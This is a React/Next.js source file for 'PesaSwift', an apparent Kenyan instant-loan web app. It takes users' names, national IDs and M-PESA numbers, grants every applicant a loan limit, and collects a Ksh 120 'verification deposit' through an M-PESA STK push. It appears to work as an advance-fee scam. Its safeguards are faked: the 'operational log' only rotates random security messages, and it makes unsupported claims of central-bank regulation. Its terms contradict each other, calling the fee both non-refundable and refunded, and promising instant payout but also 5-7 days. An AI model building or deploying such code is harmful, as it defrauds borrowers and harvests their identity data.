'use client';

import React, { useState, useEffect } from 'react';
import Modal from '@/components/Modal';
import RecentLoansToast from '@/components/RecentLoansToast';
import ThemeToggle from '@/components/ThemeToggle';

export default function UnifiedDashboard() {
  // App Step States: 
  // 1 = Configure & Apply
  // 2 = Claim qualified amount & initiate payment
  // 3 = Polling verification
  // 4 = Celebration / success
  const [currentStep, setCurrentStep] = useState(1);

  // Form Inputs
  const [formData, setFormData] = useState({
    name: '',
    phone: '',
    idNumber: '',
    loanType: 'Emergency Loan'
  });

  // UI state variables
  const [isCustomMode, setIsCustomMode] = useState(false);
  const [selectedTier, setSelectedTier] = useState(20000); // Default Ksh 20k

  // Custom configuration sliders (only shown when custom switch is active)
  const [customAmount, setCustomAmount] = useState(15000);
  const [customMonths, setCustomMonths] = useState(3);

  // Daraja dynamic tracking records
  const [qualifiedLimit, setQualifiedLimit] = useState(0);
  const [trackingId, setTrackingId] = useState('');
  const [checkoutRequestId, setCheckoutRequestId] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  // Modals
  const [isTcOpen, setIsTcOpen] = useState(false);
  const [isPrivacyOpen, setIsPrivacyOpen] = useState(false);

  // Real-time micro logs representing live network operations
  const [networkLog, setNetworkLog] = useState('DARAJA SECURE TUNNEL ESTABLISHED');
  const logs = [
    'ENCRYPTING SENSITIVE DATA WITH AES-256...',
    'SYNCING DARAJA SANDBOX CREDENTIALS...',
    'QUERYING CREDIT REFERENCE DATABASE...',
    'CBK LENDING PROTOCOLS ACTIVE...',
    'M-PESA INSTANT CHECKOUT ROUTING READY...'
  ];

  useEffect(() => {
    const interval = setInterval(() => {
      const randomLog = logs[Math.floor(Math.random() * logs.length)];
      setNetworkLog(randomLog);
    }, 4500);
    return () => clearInterval(interval);
  }, []);

  // Sync calculation parameters
  const amount = isCustomMode ? customAmount : selectedTier;
  const repaymentMonths = isCustomMode ? customMonths : (
    selectedTier === 10000 ? 2 : selectedTier === 20000 ? 3 : selectedTier === 35000 ? 4 : 6
  );
  const interestRate = 10; // flat 10%
  const totalRepayable = amount + (amount * (interestRate / 100));
  const monthlyInstallment = Math.round(totalRepayable / repaymentMonths);

  // Step 1: Submit Application / Eligibility limit check
  const handleApplySubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError(null);

    try {
      const res = await fetch('/api/eligibility', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          name: formData.name,
          phone: formData.phone,
          idNumber: formData.idNumber,
          loanType: formData.loanType
        })
      });
      const result = await res.json();

      if (!res.ok) {
        setError(result.error || 'Something went wrong.');
        setLoading(false);
        return;
      }

      // Record results and transition workspace
      setQualifiedLimit(result.data.qualifiedAmt);
      setTrackingId(result.data.trackingId);
      setLoading(false);
      setCurrentStep(2);
      
    } catch (err) {
      setError('Connection failure. Check local environment and try again.');
      setLoading(false);
    }
  };

  // Step 2: Trigger Daraja STK Push trigger
  const handleStkPush = async () => {
    setLoading(true);
    setError(null);

    try {
      const res = await fetch('/api/mpesa/stkpush', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          phone: formData.phone,
          trackingId: trackingId
        })
      });
      const result = await res.json();

      if (!res.ok) {
        setError(result.error || 'Failed to trigger M-PESA payment prompt.');
        setLoading(false);
        return;
      }

      setCheckoutRequestId(result.data.CheckoutRequestID);
      setLoading(false);
      setCurrentStep(3); // Start polling

    } catch (err) {
      setError('Failed to initiate secure STK Push. Try again.');
      setLoading(false);
    }
  };

  // Polling Status Logic
  useEffect(() => {
    let pollingInterval: NodeJS.Timeout;

    if (currentStep === 3 && checkoutRequestId) {
      pollingInterval = setInterval(async () => {
        try {
          const res = await fetch(`/api/mpesa/status?checkoutRequestId=${checkoutRequestId}`);
          const result = await res.json();

          if (result.status === 'SUCCESS') {
            clearInterval(pollingInterval);
            setCurrentStep(4); // Celebration Confetti
          } else if (result.status === 'FAILED') {
            clearInterval(pollingInterval);
            setError('Verification payment declined or cancelled. Retrying application...');
            setCurrentStep(2); // Go back to STK push stage to retry
          }
        } catch (err) {
          console.error('Polling error', err);
        }
      }, 3000); // check database every 3 seconds
    }

    return () => clearInterval(pollingInterval);
  }, [currentStep, checkoutRequestId]);

  const resetForm = () => {
    setFormData({ name: '', phone: '', idNumber: '', loanType: 'Emergency Loan' });
    setCurrentStep(1);
    setIsCustomMode(false);
    setSelectedTier(20000);
    setError(null);
  };

  return (
    <div className="app-frame">
      {/* Dynamic Toast Notifications */}
      <RecentLoansToast />

      {/* Futuristic Minimal Navigation Bar */}
      <nav className="minimal-nav">
        <div className="brand-wrapper">
          <span className="brand-logo-icon">🚀</span>
          <span className="brand-name">Pesa<span className="brand-highlight">Swift</span></span>
        </div>
        <div style={{ display: 'flex', alignItems: 'center', gap: '20px' }}>
          <div className="terminal-status-light">
            <span className="pulse-dot"></span>
            <span>CALLBACK SERVER: ACTIVE</span>
          </div>
          <ThemeToggle />
        </div>
      </nav>

      {/* Main Split Workspace layout */}
      <main className="workspace-container">
        
        {/* Left Side: Dynamic Visual Fintech terminal info display */}
        <section className="visual-terminal">
          <span className="terminal-badge">📶 SECURE DARAJA API ENCRYPTED</span>
          
          <h1 className="terminal-heading">
            Capital, delivered <br />
            <span className="terminal-gradient">in milliseconds.</span>
          </h1>

          <p className="terminal-desc">
            PesaSwift utilizes direct-to-wallet M-PESA disbursals synchronized via centralized Railway MySQL hooks. Enter your details on the terminal workspace to qualify immediately.
          </p>

          {/* Dynamic Contract breakdown showing actual repayments */}
          <div className="contract-breakdown-card">
            <div className="contract-grid">
              <div className="contract-item">
                <span className="contract-label">Requested Principal</span>
                <span className="contract-value">Ksh. {amount.toLocaleString()}</span>
              </div>
              <div className="contract-item">
                <span className="contract-label">Repayment Window</span>
                <span className="contract-value">{repaymentMonths} Months</span>
              </div>
              <div className="contract-item">
                <span className="contract-label">Lending Interest Rate</span>
                <span className="contract-value">10% (Fixed Flat)</span>
              </div>
              <div className="contract-item">
                <span className="contract-label">Monthly Installment Due</span>
                <span className="contract-value-large">Ksh. {monthlyInstallment.toLocaleString()}</span>
              </div>
            </div>

            <div className="contract-accent-banner">
              <span className="contract-label" style={{ fontSize: '0.75rem', fontFamily: 'var(--font-sans)', fontWeight: '600' }}>
                Operational Log:
              </span>
              <span style={{ fontSize: '0.75rem', fontFamily: 'var(--font-mono)', color: 'var(--primary-color)', fontWeight: '700' }}>
                ⚡ {networkLog}
              </span>
            </div>
          </div>

          {/* Testimonial Feed / Status monitor */}
          <div className="ticker-card">
            <div className="ticker-icon">🛡️</div>
            <div className="ticker-content">
              <span className="ticker-title">Central Bank Regulatory Compliance</span>
              <span className="ticker-text">Fully licensed micro-loans regulated under the Kenya Financial Association guidelines.</span>
            </div>
          </div>
        </section>

        {/* Right Side: The Unified Workspace Hub Card */}
        <section className="workspace-hub">
          
          {/* Active Step dots indicators */}
          <div className="step-indicator-bar">
            <div className={`step-dot-wrapper ${currentStep >= 1 ? 'active' : ''}`}>
              <div className={`step-dot ${currentStep === 1 ? 'active' : ''} ${currentStep > 1 ? 'completed' : ''}`}>
                {currentStep > 1 ? '✓' : '1'}
              </div>
              <span className="step-label">Application</span>
            </div>
            <div className={`step-dot-wrapper ${currentStep >= 2 ? 'active' : ''}`}>
              <div className={`step-dot ${currentStep === 2 ? 'active' : ''} ${currentStep > 2 ? 'completed' : ''}`}>
                {currentStep > 2 ? '✓' : '2'}
              </div>
              <span className="step-label">Limit</span>
            </div>
            <div className={`step-dot-wrapper ${currentStep >= 3 ? 'active' : ''}`}>
              <div className={`step-dot ${currentStep === 3 ? 'active' : ''} ${currentStep > 3 ? 'completed' : ''}`}>
                {currentStep > 3 ? '✓' : '3'}
              </div>
              <span className="step-label">Verification</span>
            </div>
            <div className={`step-dot-wrapper ${currentStep >= 4 ? 'active' : ''}`}>
              <div className={`step-dot ${currentStep === 4 ? 'active' : ''}`}>4</div>
              <span className="step-label">Payout</span>
            </div>
          </div>

          {/* WORKSPACE STEP 1: CONFIGURE LOAN & FORM DETAILS */}
          {currentStep === 1 && (
            <form onSubmit={handleApplySubmit} style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
              <div>
                <h3 style={{ fontSize: '1.25rem', marginBottom: '8px' }}>Select Qualified Tier</h3>
                <p style={{ fontSize: '0.85rem', color: 'var(--text-secondary)', marginBottom: '16px' }}>
                  Pick one of our pre-approved loan packages or switch to a custom setup.
                </p>

                {/* Tier Switch Switcher */}
                <div className="slider-toggle-row">
                  <span>Configure custom amount manually</span>
                  <label className="switch">
                    <input 
                      type="checkbox" 
                      checked={isCustomMode}
                      onChange={(e) => setIsCustomMode(e.target.checked)}
                    />
                    <span className="slider-switch"></span>
                  </label>
                </div>

                {!isCustomMode ? (
                  /* Standard Quick Select Tier buttons */
                  <div className="tier-selector-grid">
                    <button 
                      type="button" 
                      className={`tier-card-btn ${selectedTier === 10000 ? 'active' : ''}`}
                      onClick={() => setSelectedTier(10000)}
                    >
                      <span className="tier-amount">Ksh. 10,000</span>
                      <span className="tier-period">2 Months Repay</span>
                    </button>
                    <button 
                      type="button" 
                      className={`tier-card-btn ${selectedTier === 20000 ? 'active' : ''}`}
                      onClick={() => setSelectedTier(20000)}
                    >
                      <span className="tier-amount">Ksh. 20,000</span>
                      <span className="tier-period">3 Months Repay</span>
                    </button>
                    <button 
                      type="button" 
                      className={`tier-card-btn ${selectedTier === 35000 ? 'active' : ''}`}
                      onClick={() => setSelectedTier(35000)}
                    >
                      <span className="tier-amount">Ksh. 35,000</span>
                      <span className="tier-period">4 Months Repay</span>
                    </button>
                    <button 
                      type="button" 
                      className={`tier-card-btn ${selectedTier === 50000 ? 'active' : ''}`}
                      onClick={() => setSelectedTier(50000)}
                    >
                      <span className="tier-amount">Ksh. 50,000</span>
                      <span className="tier-period">6 Months Repay</span>
                    </button>
                  </div>
                ) : (
                  /* Custom range Sliders selectors */
                  <div className="custom-sliders-panel">
                    <div className="custom-slider-row">
                      <div className="slider-info-row">
                        <span>Requested Amount</span>
                        <span className="slider-val-glow">Ksh. {customAmount.toLocaleString()}</span>
                      </div>
                      <input 
                        type="range" 
                        min="5000" 
                        max="50000" 
                        step="5000" 
                        value={customAmount}
                        onChange={(e) => setCustomAmount(Number(e.target.value))}
                        style={{ width: '100%' }}
                      />
                      <div style={{ display: 'flex', justifySelf: 'stretch', justifyContent: 'space-between', fontSize: '0.75rem', color: 'var(--text-muted)', marginTop: '4px' }}>
                        <span>Ksh. 5,000</span>
                        <span>Ksh. 50,000</span>
                      </div>
                    </div>

                    <div className="custom-slider-row">
                      <div className="slider-info-row">
                        <span>Repayment Period</span>
                        <span className="slider-val-glow">{customMonths} Months</span>
                      </div>
                      <input 
                        type="range" 
                        min="2" 
                        max="12" 
                        step="1" 
                        value={customMonths}
                        onChange={(e) => setCustomMonths(Number(e.target.value))}
                        style={{ width: '100%' }}
                      />
                      <div style={{ display: 'flex', justifySelf: 'stretch', justifyContent: 'space-between', fontSize: '0.75rem', color: 'var(--text-muted)', marginTop: '4px' }}>
                        <span>2 Months</span>
                        <span>12 Months</span>
                      </div>
                    </div>
                  </div>
                )}
              </div>

              {/* Form Input fields */}
              <div style={{ display: 'flex', flexDirection: 'column', gap: '14px' }}>
                <div className="form-group" style={{ marginBottom: 0 }}>
                  <label className="form-input-label">M-PESA Number</label>
                  <input 
                    type="text" 
                    placeholder="e.g. 0712345678" 
                    className="form-input"
                    value={formData.phone}
                    onChange={(e) => { setFormData({ ...formData, phone: e.target.value }); setError(null); }}
                    required
                  />
                </div>
                <div className="responsive-form-grid">
                  <div className="form-group" style={{ marginBottom: 0 }}>
                    <label className="form-input-label">Full Name</label>
                    <input 
                      type="text" 
                      placeholder="As on National ID" 
                      className="form-input"
                      value={formData.name}
                      onChange={(e) => { setFormData({ ...formData, name: e.target.value }); setError(null); }}
                      required
                    />
                  </div>
                  <div className="form-group" style={{ marginBottom: 0 }}>
                    <label className="form-input-label">National ID Number</label>
                    <input 
                      type="text" 
                      placeholder="8-digit ID" 
                      className="form-input"
                      value={formData.idNumber}
                      onChange={(e) => { setFormData({ ...formData, idNumber: e.target.value }); setError(null); }}
                      required
                    />
                  </div>
                </div>
              </div>

              {error && <span className="error-message" style={{ margin: 0 }}>⚠️ {error}</span>}

              <button type="submit" className="unified-btn" disabled={loading}>
                {loading ? 'CALCULATING ELIGIBILITY...' : 'CALCULATE QUALIFIED LIMIT ➔'}
              </button>
            </form>
          )}

          {/* WORKSPACE STEP 2: ELIGIBILITY APPROVED & CLAIM */}
          {currentStep === 2 && (
            <div className="verification-card">
              <div className="verification-header">
                <h3>Congratulations {formData.name.split(' ')[0]}!</h3>
                <p style={{ fontSize: '0.85rem', color: 'var(--text-secondary)', marginTop: '4px' }}>
                  Our CBK automated engines have approved your qualified lending limit.
                </p>
              </div>

              <div className="verification-list">
                <div className="verification-row">
                  <span>Authorized Tracking ID</span>
                  <strong>{trackingId}</strong>
                </div>
                <div className="verification-row">
                  <span>Selected Loan Type</span>
                  <strong>{formData.loanType}</strong>
                </div>
                <div className="verification-row highlight">
                  <span>Approved Lending Limit</span>
                  <strong>Ksh. {qualifiedLimit.toLocaleString()}</strong>
                </div>
                <div className="verification-row">
                  <span>CBK Processing Charge</span>
                  <strong>Ksh. 120</strong>
                </div>
              </div>

              <p className="verification-agreement">
                To prevent digital fraud and authenticate disbursement, Safaricom Daraja API requires a non-refundable verification deposit of Ksh. 120. This will be automatically refunded alongside your principal.
              </p>

              {error && <span className="error-message">⚠️ {error}</span>}

              <div className="responsive-action-grid">
                <button type="button" className="btn-secondary" onClick={() => setCurrentStep(1)}>
                  Back
                </button>
                <button type="button" className="unified-btn" onClick={handleStkPush} disabled={loading}>
                  {loading ? 'INITIATING STK...' : 'DISBURSE FUNDS NOW ➔'}
                </button>
              </div>
            </div>
          )}

          {/* WORKSPACE STEP 3: POLLING CHECKOUT STATUS */}
          {currentStep === 3 && (
            <div className="polling-panel">
              <div className="polling-globe"></div>
              
              <div className="verification-header">
                <h3>Awaiting M-PESA Confirmation</h3>
                <p style={{ fontSize: '0.85rem', color: 'var(--text-secondary)', marginTop: '4px' }}>
                  A Daraja checkout prompt has been delivered to your Safaricom terminal.
                </p>
              </div>

              <div className="verification-list" style={{ width: '100%' }}>
                <div className="polling-text">
                  1. Check your mobile phone screen for a prompt.<br />
                  2. Enter your <strong>M-PESA PIN</strong> to authorize checkout.<br />
                  3. Hold on while our server syncs Railway callback hooks.
                </div>
              </div>

              {error && <span className="error-message">⚠️ {error}</span>}

              <button 
                type="button" 
                className="btn-secondary" 
                onClick={() => {
                  setError(null);
                  setCurrentStep(2);
                }}
                style={{ width: '100%', marginTop: '10px' }}
              >
                Cancel & Edit Details
              </button>
            </div>
          )}

          {/* WORKSPACE STEP 4: SUCCESS DISBURSAL CELEBRATION */}
          {currentStep === 4 && (
            <div className="victory-panel">
              {/* CSS Confetti Pieces */}
              <div className="confetti-container">
                {[...Array(24)].map((_, i) => (
                  <div key={i} className={`confetti piece-${i}`}></div>
                ))}
              </div>

              <div className="victory-checkmark">✓</div>

              <h2 className="victory-title">Funds Disbursed!</h2>
              <p className="victory-desc" style={{ color: 'var(--text-secondary)' }}>
                Your validation fee has been successfully authenticated by Safaricom.
              </p>

              <div className="victory-amount-box">
                <span className="victory-amount-label">Processing Instant Payout to {formData.phone}</span>
                <span className="victory-amount-value">Ksh. {qualifiedLimit.toLocaleString()}</span>
              </div>

              <p className="victory-desc" style={{ fontSize: '0.85rem' }}>
                Hi <strong>{formData.name.split(' ')[0]}</strong>, the qualified capital is currently routing via Daraja endpoints. Funds will populate in your mobile wallet in <strong>5-7 working days</strong>.
              </p>

              <button type="button" className="unified-btn" onClick={resetForm} style={{ marginTop: '10px' }}>
                Return to Workspace Dashboard
              </button>
            </div>
          )}

          {/* Workspace Footer Modals */}
          <div className="form-privacy-note" style={{ borderTop: '1px solid var(--border-color)', paddingTop: '15px', marginTop: '20px', fontSize: '0.75rem', color: 'var(--text-muted)', textAlign: 'center' }}>
            By using this terminal, you consent to our{' '}
            <button className="text-btn" type="button" onClick={() => setIsTcOpen(true)}>Terms & Conditions</button>
            {' '}and{' '}
            <button className="text-btn" type="button" onClick={() => setIsPrivacyOpen(true)}>Privacy Policy</button>.
          </div>

        </section>
      </main>

      {/* Legal Footer */}
      <footer className="app-footer">
        &copy; 2026 PesaSwift Instant Micro-Loans. Regulated by the Central Bank of Kenya.
      </footer>

      {/* Terms & Privacy Modals */}
      <Modal isOpen={isTcOpen} onClose={() => setIsTcOpen(false)} title="Terms & Conditions">
        <div style={{ display: 'flex', flexDirection: 'column', gap: '12px', fontSize: '0.85rem' }}>
          <p>1. Borrowers must possess a valid Kenyan National ID and be 18 years or older.</p>
          <p>2. Loan facilities are charged at a flat interest rate of 10% per transaction.</p>
          <p>3. PesaSwift requires a non-refundable M-PESA validation fee of Ksh. 120, sent via STK Push, to authenticate details and prevent identity fraud.</p>
          <p>4. Upon validation, disbursal is executed instantly to the provided M-PESA number.</p>
        </div>
      </Modal>

      <Modal isOpen={isPrivacyOpen} onClose={() => setIsPrivacyOpen(false)} title="Privacy Policy">
        <div style={{ display: 'flex', flexDirection: 'column', gap: '12px', fontSize: '0.85rem' }}>
          <p>1. We collect full name, phone number, ID number, and preferred loan classification to verify loan limits.</p>
          <p>2. Data is encrypted and securely stored in our MySQL serverless database on Railway.</p>
          <p>3. We do not store or access your credit cards, banking passwords, or M-PESA PIN.</p>
          <p>4. You can request account deletion by contacting support.</p>
        </div>
      </Modal>
    </div>
  );
}
